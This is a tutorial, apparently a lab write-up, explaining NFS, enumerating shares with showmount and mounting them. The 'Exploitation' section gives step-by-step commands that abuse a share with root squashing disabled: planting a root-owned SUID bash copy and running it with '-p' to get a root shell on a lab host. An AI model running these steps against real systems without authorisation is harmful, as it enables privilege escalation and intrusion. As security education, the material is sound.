
NFS stands for "Network File System" and allows a system to share directories and files with others over a network. By using NFS, users and programs can access files on remote systems almost as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.

First, the client will request to mount a directory from a remote host on a local directory just the same way it can mount a physical device. The mount service will then act to connect to the relevant mount daemon using RPC.

The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.

If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:

-  The file handle
-  The name of the file to be accessed
-  The user's, user ID
-  The user's group ID  

These are used in determining access rights to the specified file. This is what controls user permissions, I.E read and write of files. Using the NFS protocol, you can transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or UNIX.

Current version of NFS is 4.2.

## **Enumeration**

It is important to have **NFS-Common** installed on any machine that uses NFS, either as client or server. It includes programs such as: **lockd**, **statd**, **showmount**, **nfsstat**, **gssd**, **idmapd** and **mount.nfs**.

The following can be used to list NFS shares :

```bash
/usr/sbin/showmount -e [IP]
```

Your client’s system needs a directory where all the content shared by the host server in the export folder can be accessed. For e.g.., `/tmp/mount`.

Once you've created this mount point, you can use the "mount" command to connect the NFS share to the mount point on your machine like so:

```bash
sudo mount -t nfs IP:share /tmp/mount/ -nolock
```


## **Exploitation**

If you have a low privilege shell on any machine and you found that a machine has an NFS share you might be able to use that to escalate privileges, depending on how it is configured.

By default, on NFS shares- **Root Squashing** is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.

To prepare we navigate to the mounted folder on our attacker machine : 

```bash
/tmp/mount🔒 
❯ cd user/
```

We begin by copying over the bash executable to our attacker machine from the victim machine in order to ensure compatibility using : 

```bash
❯ scp -i /path/to/id_rsa user@10.10.83.29:/bin/bash ~/Downloads/bash
```

We then copy it into the mounted folder : 

```bash
tmp/mount/user 
❯ cp ~/Downloads/bash .
```

We then provide the bash executable to be owned by a root user and possess the SUID bit : 

```bash
❯ sudo chown root ./bash

❯ sudo chmod +s bash
```

The permissions should read as follows : 

```bash
/tmp/mount/cappucino 
❯ ls -al
total 1124
drwxr-xr-x 5 kali kali    4096 Jan 21 11:06 ./
drwxr-xr-x 3 root root    4096 Apr 22  2020 ../
-rwsr-sr-x 1 root kali 1113504 Jan 21 11:06 bash*
```

We then SSH into the user and run our malicious bash executable with the `-p` flag to maintain permissions to obtain a `root` shell : 

```bash
user@10.10.83.29:~$ ./bash -p
```



